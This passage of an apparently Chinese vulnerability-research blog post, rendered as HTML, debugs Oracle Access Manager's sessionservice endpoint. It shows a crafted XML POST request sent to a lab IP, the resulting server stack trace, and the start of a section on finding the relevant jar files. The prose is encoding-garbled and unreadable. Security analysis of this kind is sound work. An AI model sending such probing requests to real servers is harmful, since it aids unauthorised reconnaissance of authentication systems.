</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 294
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;YWJjZA==&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>çœ‹åˆ°æ—¥å¿—ä¸­çš„æŠ¥é”™è°ƒç”¨æ ˆä¸º</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-56>56</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;Mar 22, 2022 2:33:02,196 AM GMT&gt; &lt;Warning&gt; &lt;oracle.oam.binding&gt; &lt;BEA-000000&gt; &lt;Error while processing Master Controller in PBL
</span></span><span style=display:flex><span>java.lang.NullPointerException
</span></span><span style=display:flex><span>â˜…  at oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent.isRequesterSessionID(OpenssoCheckValidSessionEvent.java:58)
</span></span><span style=display:flex><span>	at oracle.security.am.proxy.opensso.controller.OpenssoFlowController.getNextEventHint(OpenssoFlowController.java:515)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getEventHint(AbstractEventFlowController.java:193)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getSuccessFailEvent(AbstractEventFlowController.java:158)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getNextEvent(AbstractEventFlowController.java:99)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.getNextEvent(MasterController.java:236)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processEvent(MasterController.java:615)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.process(MasterController.java:708)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)
</span></span><span style=display:flex><span>â˜…  at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)
</span></span><span style=display:flex><span>	at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)
</span></span><span style=display:flex><span>	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175)
</span></span><span style=display:flex><span>	at java.security.AccessController.doPrivileged(Native Method)
</span></span><span style=display:flex><span>	at oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763)
</span></span><span style=display:flex><span>	at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344)
</span></span><span style=display:flex><span>	at weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197)
</span></span><span style=display:flex><span>	at weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203)
</span></span><span style=display:flex><span>	at weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680)
</span></span><span style=display:flex><span>	at weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272)
</span></span><span style=display:flex><span>	at weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352)
</span></span><span style=display:flex><span>	at weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337)
</span></span><span style=display:flex><span>	at weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57)
</span></span><span style=display:flex><span>	at weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41)
</span></span><span style=display:flex><span>	at weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655)
</span></span><span style=display:flex><span>	at weblogic.work.ExecuteThread.execute(ExecuteThread.java:420)
</span></span><span style=display:flex><span>	at weblogic.work.ExecuteThread.run(ExecuteThread.java:360)
</span></span></code></pre></td></tr></table></div></div><h2 id=ç¡®å®šå…³é”®æ–­ç‚¹çš„ä½ç½®å’Œç›¸å…³çš„ä¾èµ–åŒ…>â‘£ç¡®å®šå…³é”®æ–­ç‚¹çš„ä½ç½®å’Œç›¸å…³çš„ä¾èµ–åŒ…<a hidden class=anchor aria-hidden=true href=#ç¡®å®šå…³é”®æ–­ç‚¹çš„ä½ç½®å’Œç›¸å…³çš„ä¾èµ–åŒ…>#</a></h2><p>ä»æŠ¥é”™è°ƒç”¨æ ˆå¯ä»¥çœ‹åˆ°æ¥å£ <code>/oam/server/opensso/sessionservice</code> æ˜¯ç”± <code>oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)</code> å¤„ç†çš„ï¼Œæˆ‘ä»¬æƒ³çŸ¥é“è¿™ä¸ªç±»ä½äºé‚£ä¸ªjaråŒ…ä¸­ï¼Œä»¥åŠæ•´ä¸ªè¯·æ±‚å¤„ç†è¿‡ç¨‹ä¾èµ–å“ªäº›jaråŒ…ã€‚</p><p>å°è¯•ä»¥ä¸‹æ–¹æ³•ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-30>30</a>
